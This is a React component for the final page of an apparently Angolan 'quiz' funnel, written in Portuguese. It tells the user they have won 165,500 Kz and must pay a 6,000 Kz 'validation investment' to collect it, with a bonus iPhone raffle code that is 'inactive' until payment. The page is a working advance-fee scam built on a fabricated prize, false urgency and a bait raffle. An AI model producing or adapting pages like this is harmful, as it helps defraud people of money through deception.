import React from 'react';
import PageWrapper from '@/components/PageWrapper';
import { Button } from '@/components/ui/button';
import { CheckCircle2, Gift, Ticket, Phone, AlertCircle } from 'lucide-react';
const FinalPage = ({
  name,
  showValidateButton,
  onValidate
}) =>     <PageWrapper>
        <div className="w-full max-w-3xl text-center">
            <div className="bg-white rounded-2xl p-6 shadow-2xl mb-6 text-gray-800">
                <CheckCircle2 className="w-10 h-10 mx-auto text-yellow-500 mb-2" />
                <h1 className="text-2xl font-bold">Parabéns, {name}!</h1>
                <div className="bg-yellow-400 rounded-lg p-4 my-4">
                    <p className="text-sm font-bold">💰 TOTAL GANHO 💰</p>
                    <p className="text-4xl font-extrabold">165 500 Kz</p>
                </div>
            </div>
            <div className="aspect-video w-full mb-6 rounded-xl overflow-hidden shadow-lg">
                <iframe id="panda-a477263f-4b32-4c74-9b77-011a532e3411" src="https://player-vz-35d0a572-7e6.tv.pandavideo.com.br/embed/?v=a477263f-4b32-4c74-9b77-011a532e3411" style={{
        border: 'none'
      }} allow="accelerometer;gyroscope;autoplay;encrypted-media;picture-in-picture" allowFullScreen={true} width="100%" height="100%" fetchPriority="high" title="Vídeo de Apresentação do Quiz Angola" />
            </div>
            <div className="bg-white rounded-2xl p-6 shadow-2xl text-left text-gray-800">
                <h2 className="text-xl font-bold mb-4 text-center">📋 Veja Como Receber o Seu Prémio</h2>
                {showValidateButton ? <Button onClick={onValidate} className="w-full bg-yellow-400 text-red-800 font-bold text-xl py-4 rounded-lg shadow-lg hover:bg-yellow-500 mb-4">VALIDAR AGORA - 6 000 Kz</Button> : <div className="text-center text-gray-600 font-bold p-4 bg-gray-200 rounded-lg mb-4">
                        Aguarde para validar...
                    </div>}
                <p className="text-center text-xs text-gray-500 mb-4">Investimento único de 6 000 Kz para validação e recebimento em até 24h</p>
                <div className="space-y-3">
                    <div className="flex items-start gap-3">
                        <div className="bg-yellow-400 text-red-800 rounded-full w-6 h-6 flex items-center justify-center font-bold flex-shrink-0">1</div>
                        <p><span className="font-bold">Validação rápida</span> - Invista 6 000 Kz para processar</p>
                    </div>
                    <div className="flex items-start gap-3">
                        <div className="bg-yellow-400 text-red-800 rounded-full w-6 h-6 flex items-center justify-center font-bold flex-shrink-0">2</div>
                        <p><span className="font-bold">Verificação automática</span> dos seus dados</p>
                    </div>
                    <div className="flex items-start gap-3">
                        <div className="bg-yellow-400 text-red-800 rounded-full w-6 h-6 flex items-center justify-center font-bold flex-shrink-0">3</div>
                        <p><span className="font-bold">Receba 165 500 Kz</span> na sua conta em 24h! 🎉</p>
                    </div>
                </div>
            </div>
            <div className="bg-gradient-to-br from-red-800 to-pink-600 rounded-2xl p-6 shadow-2xl mb-6 text-white">
                <h2 className="text-xl font-bold mb-4 text-center flex items-center justify-center gap-2">
                    <Gift className="w-5 h-5" /> BÓNUS ESPECIAL <Gift className="w-5 h-5" />
                </h2>
                <div className="bg-white rounded-xl p-4 mb-4 text-gray-800">
                    <h3 className="text-lg font-bold mb-3 text-center">Sorteio de um iPhone 11 Pro Max</h3>
                    <div className="flex justify-center mb-4 bg-gray-50 rounded-lg p-4">
                        <img alt="iPhone 11 Pro Max" className="w-40 h-56 object-contain" src="https://images.unsplash.com/photo-1592750475338-74b7b21085ab?w=500&h=700&fit=crop" />
                    </div>
                    <div className="bg-gray-50 rounded-lg p-3 mb-4">
                        <h4 className="font-bold mb-2 flex items-center gap-2">
                            <Phone className="w-4 h-4" /> Especificações
                        </h4>
                        <div className="text-sm space-y-1">
                            <p><span className="font-semibold">Tela:</span> 6.5" Super Retina XDR</p>
                            <p><span className="font-semibold">Câmera:</span> Tripla 12MP</p>
                            <p><span className="font-semibold">Chip:</span> A13 Bionic</p>
                            <p><span className="font-semibold">Bateria:</span> Até 20h de vídeo</p>
                            <p><span className="font-semibold">Armazenamento:</span> 256GB</p>
                            <p><span className="font-semibold">Cor:</span> Midnight Green</p>
                        </div>
                    </div>
                    <div className="bg-gradient-to-r from-yellow-400 to-yellow-500 rounded-lg p-4 mb-3">
                        <p className="text-xs font-bold text-red-800 mb-2 flex items-center justify-center gap-2">
                            <Ticket className="w-4 h-4" /> SEU CÓDIGO DE SORTEIO
                        </p>
                        <p className="text-2xl font-extrabold text-red-800 text-center">IPHONE-773E9115</p>
                    </div>
                    <div className="bg-red-100 border border-red-300 rounded-lg p-3 mb-3 flex items-center gap-2">
                        <AlertCircle className="w-5 h-5 text-red-600 flex-shrink-0" />
                        <p className="text-sm font-bold text-red-800">CÓDIGO INATIVO</p>
                    </div>
                    <p className="text-xs text-gray-600 text-center mb-3">Este código só será válido após a confirmação do pagamento</p>
                    <div className="text-xs text-gray-700 space-y-2">
                        <p className="flex items-start gap-2">
                            <span className="text-yellow-500 font-bold">•</span>
                            <span>Sorteio realizado todo mês entre os participantes válidos</span>
                        </p>
                        <p className="flex items-start gap-2">
                            <span className="text-yellow-500 font-bold">•</span>
                            <span>Guarde seu código! Ele será usado na hora do sorteio</span>
                        </p>
                        <p className="flex items-start gap-2">
                            <span className="text-yellow-500 font-bold">•</span>
                            <span>Apenas códigos de pagamentos confirmados participam</span>
                        </p>
                    </div>
                </div>
            </div>
            <img alt="Palanca Negra" class="w-16 h-16 mx-auto mt-4" src="https://horizons-cdn.hostinger.com/43619163-4fd6-4960-ba57-04c4420f1730/chatgpt-image-16_11_2025-02_40_52-JhlHE.png" />
        </div>
    </PageWrapper>;
export default FinalPage;